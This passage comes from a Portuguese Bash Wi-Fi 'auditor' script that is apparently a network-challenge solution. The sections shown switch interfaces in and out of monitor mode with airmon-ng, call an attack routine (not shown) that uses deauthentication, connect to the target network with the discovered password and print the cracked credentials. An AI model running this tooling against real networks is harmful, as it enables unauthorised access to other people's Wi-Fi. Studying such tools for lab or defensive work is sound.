# 14. VOLTAR AO MODO GERENCIADO, CONECTAR E LER O GATEWAY
# ============================================================================

conectar_e_obter_gateway() {
    if [[ -z "${SENHA_ENCONTRADA}" ]]; then
        log "Sem senha descoberta — não é possível conectar automaticamente para ler o gateway."
        return 1
    fi

    log "Restaurando modo gerenciado..."
    airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
    systemctl restart NetworkManager &>>"$LOGFILE"
    sleep 5
    # NM já foi restaurado aqui — zera a flag pra o trap de cleanup não
    # reiniciar o NetworkManager de novo (desconexão breve desnecessária).
    MONITOR_MODE_ATIVO=0

    log "Conectando à rede ${TARGET_ESSID} com a senha descoberta..."
    # Aspas simples preservam caracteres especiais (&, $, :, etc.) na senha
    if ! nmcli dev wifi connect "${TARGET_ESSID}" password "${SENHA_ENCONTRADA}" \
        bssid "${TARGET_BSSID}" ifname "${IFACE}" &>>"$LOGFILE"; then
        erro "Falha ao conectar especificamente ao BSSID selecionado."
        return 1
    fi
    sleep 5

    IP_ROTEADOR="$(ip route | awk '/^default/{print $3; exit}')"
    if [[ -n "${IP_ROTEADOR}" ]]; then
        log "Gateway (IP do roteador) obtido: ${IP_ROTEADOR}"
    else
        erro "Não foi possível obter o gateway após conectar."
    fi
}

# ============================================================================
# 15. RESUMO FINAL
# ============================================================================

imprimir_resumo() {
    local freq_mhz=""
    if [[ "${TARGET_FREQ_LABEL}" == "5 GHz" ]]; then
        freq_mhz="(5${TARGET_CH}00 ~ calcule exato via tabela de canais 5GHz)"
    else
        freq_mhz="($(( 2407 + TARGET_CH * 5 )) MHz aprox.)"
    fi

    {
        echo "================= RESPOSTAS DO DESAFIO ================="
        echo "ESSID .............: ${TARGET_ESSID}"
        echo "Frequência ........: ${TARGET_FREQ_LABEL} ${freq_mhz}"
        echo "Canal .............: ${TARGET_CH}"
        echo "MAC do roteador ...: ${TARGET_BSSID}"
        echo "IP do roteador ....: ${IP_ROTEADOR:-<não obtido>}"
        echo "Senha .............: ${SENHA_ENCONTRADA:-<não descoberta>}"
        echo "Rota usada ........: ${ROTA_USADA:-<nenhuma / somente dados>}"
        echo "Deauth estado .....: ${DEAUTH_ESTADO}"
        echo "==========================================================="
    } | tee "${RESPOSTAS}"

    echo "(salvo em ${RESPOSTAS})"
    log "Resumo final salvo em ${RESPOSTAS}"
}

# ============================================================================
# 16. MENU PRINCIPAL
# ============================================================================

menu_principal() {
    # IMPORTANTE: esta função é chamada diretamente (não via "$(menu_principal)"),
    # porque command substitution captura TODO o stdout da função — se fosse
    # capturada, as linhas do menu abaixo iriam parar dentro da variável em vez
    # de aparecer na tela. Por isso ela escreve o resultado numa variável global
    # (MENU_OPCAO) em vez de usar "echo" como retorno.
    echo
    echo "======================================"
    echo " Auditor WiFi — Desafio de Redes"
    echo "======================================"
    echo "[1] Rodar auditoria completa (dados + senha)"
    echo "[2] Só descobrir dados do AP (sem tentar senha)"
    echo "[3] Sair"
    echo
    read -rp "Escolha: " MENU_OPCAO
}

# ============================================================================
# FLUXO PRINCIPAL
# ============================================================================

restaurar_rede_emergencia() {
    # Botão de emergência: restaura a rede independente de qualquer estado
    # interno (útil se uma execução anterior travou e deixou a placa em
    # modo monitor, ou se o processo morreu sem passar pelo trap de cleanup).
    log "=== Restauração de emergência solicitada (--restaurar) ==="
    local qualquer_mon
    qualquer_mon="$(iw dev | awk '/Interface/{print $2}' | grep -i 'mon' | head -n1)"
    if [[ -n "${qualquer_mon}" ]]; then
        log "Encontrada interface em modo monitor: ${qualquer_mon}. Parando..."
        timeout --kill-after=5 15s airmon-ng stop "${qualquer_mon}" &>>"$LOGFILE"
    else
        log "Nenhuma interface em modo monitor encontrada."
    fi
    log "Religando NetworkManager..."
    timeout --kill-after=5 15s systemctl restart NetworkManager &>>"$LOGFILE" \
        || timeout --kill-after=5 15s service network-manager restart &>>"$LOGFILE"
    sleep 2
    log "Restauração concluída."
    echo ">>> Rede restaurada. Se ainda não voltou, reinicie a máquina."
}

main() {
    if [[ "${EUID}" -ne 0 ]]; then
        erro "Este script precisa rodar como root (sudo ./auditor.sh)."
        exit 1
    fi

    : > "$LOGFILE"
    log "=== Iniciando auditor.sh ==="

    # suporte à flag --restaurar: botão de emergência, roda e sai, sem menu
    for arg in "$@"; do
        if [[ "$arg" == "--restaurar" ]]; then
            restaurar_rede_emergencia
            exit 0
        fi
    done

    # Impede que CLI e painel manipulem a mesma interface ao mesmo tempo.
    exec 9>"${LOCKFILE}"
    if ! flock -n 9; then
        erro "Outra instância do WiFi Auditor já está usando a interface."
        exit 1
    fi
    echo "$$" 1>&9

    # suporte à flag --somente-dados
    for arg in "$@"; do
        [[ "$arg" == "--somente-dados" ]] && SOMENTE_DADOS=1
    done

    local opcao
    if [[ "${SOMENTE_DADOS}" -eq 1 ]]; then
        opcao=2
    else
        MENU_OPCAO=""
        menu_principal
        opcao="${MENU_OPCAO}"
    fi

    case "$opcao" in
        1|2)
            verificar_dependencias
            garantir_wordlist
            detectar_interface
            entrar_modo_monitor
            escanear_e_escolher_alvo

            if [[ "$opcao" == "1" ]]; then
                if executar_ataque; then
                    conectar_e_obter_gateway
                fi
            else
                log "Modo 'somente dados' — pulando etapa de ataque."
            fi

            imprimir_resumo
            ;;
        3)
            log "Saindo sem executar nada."
            exit 0
            ;;
        *)
            erro "Opção inválida."
            exit 1
            ;;
    esac

    log "=== Fim da execução ==="
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    main "$@"
fi
